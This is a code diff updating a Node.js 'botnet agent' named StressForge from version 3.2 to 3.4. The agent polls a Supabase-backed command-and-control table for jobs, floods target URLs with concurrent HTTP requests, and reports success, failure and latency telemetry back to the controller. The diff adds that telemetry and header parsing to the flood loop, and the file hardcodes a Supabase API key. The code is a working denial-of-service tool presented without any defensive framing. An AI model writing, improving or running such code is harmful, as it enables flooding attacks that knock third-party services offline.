@@ -1,8 +1,8 @@
 /**
- * STRESSFORGE BOTNET AGENT V3.2 (STABLE)
- * - Fixed: Immediate completion bug (Null Duration)
- * - Fixed: URL Parsing for connection stability
- * - Added: Verbose logging for Render debugging
+ * STRESSFORGE BOTNET AGENT V3.4 (ENTERPRISE)
+ * - Fixed: Zero Stats Bug
+ * - Feature: Success/Fail/Latency Telemetry
+ * - Feature: Robust Error Handling
  */
 const https = require('https');
 const http = require('http');
@@ -13,7 +13,7 @@ const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZ
 
 // --- RENDER KEEP-ALIVE ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent Active'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V3.4 Active'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: ROBUST REQUEST ---
@@ -51,7 +51,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[36m[AGENT] Initialized V3.2. Polling C2...\x1b[0m');
+console.log('\x1b[36m[AGENT] Initialized V3.4. Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -60,36 +60,61 @@ const startAttack = (job) => {
     if (activeJob) return;
     activeJob = job;
     
-    // SAFETY: Handle null/zero duration
-    const duration = (job.duration && job.duration > 0) ? job.duration : 30; // Default to 30s if missing
-    
+    const duration = (job.duration && job.duration > 0) ? job.duration : 30;
     console.log(`\x1b[33m[ATTACK] ${job.method || 'GET'} ${job.target} | Threads: ${job.concurrency} | Duration: ${duration}s\x1b[0m`);
     
     let running = true;
     let totalRequests = 0;
-    const startTime = Date.now();
     
+    // Telemetry
+    let jobSuccess = 0;
+    let jobFailed = 0;
+    let jobLatencySum = 0;
+    let jobReqsForLatency = 0;
+    
+    const startTime = Date.now();
     let targetUrl;
     try { targetUrl = new URL(job.target); } catch(e) { console.error('Invalid Target URL'); return; }
     
     const agent = new https.Agent({ keepAlive: true, maxSockets: 5000 });
     const requestLib = targetUrl.protocol === 'https:' ? https : http;
+    
+    let headers = job.headers || {};
+    if (typeof headers === 'string') {
+        try { headers = JSON.parse(headers); } catch(e) { headers = {}; }
+    }
+
     const reqOptions = {
         agent,
         method: job.method || 'GET',
-        headers: job.headers || {},
+        headers: headers,
     };
     reqOptions.headers['Host'] = targetUrl.host;
     reqOptions.headers['Cache-Control'] = 'no-cache';
 
     const flood = () => {
         if (!running) return;
+        
+        const start = Date.now();
         const req = requestLib.request(job.target, reqOptions, (res) => {
-            res.resume(); 
-            totalRequests++;
-            flood();
+            res.resume(); // consume body
+            res.on('end', () => {
+                 const lat = Date.now() - start;
+                 jobLatencySum += lat;
+                 jobReqsForLatency++;
+                 
+                 if (res.statusCode >= 200 && res.statusCode < 300) jobSuccess++;
+                 else jobFailed++;
+                 
+                 totalRequests++;
+                 flood();
+            });
         });
-        req.on('error', () => { totalRequests++; flood(); });
+        req.on('error', () => { 
+            jobFailed++; 
+            totalRequests++; 
+            flood(); 
+        });
         
         if (job.body && ['POST','PUT','PATCH'].includes(job.method)) {
              try { req.write(typeof job.body === 'string' ? job.body : JSON.stringify(job.body)); } catch(e) {}
@@ -102,12 +127,17 @@ const startAttack = (job) => {
     activeLoop = setInterval(async () => {
         const elapsed = (Date.now() - startTime) / 1000;
         const rps = Math.floor(totalRequests / elapsed) || 0;
+        const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
         
         try {
-             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { current_rps: rps });
+             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { 
+                 current_rps: rps,
+                 total_success: jobSuccess,
+                 total_failed: jobFailed,
+                 avg_latency: avgLat
+             });
         } catch(e) { console.error('[SYNC-ERR] Failed to report stats'); }
 
-        // STRICT COMPLETION CHECK
         if (duration > 0 && elapsed >= duration) {
             running = false;
             clearInterval(activeLoop);
@@ -129,7 +159,5 @@ setInterval(async () => {
             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
             startAttack(job);
         }
-    } catch (e) { 
-        // Silent catch for poll errors to prevent log spam, unless critical
-    }
+    } catch (e) { }
 }, 3000);
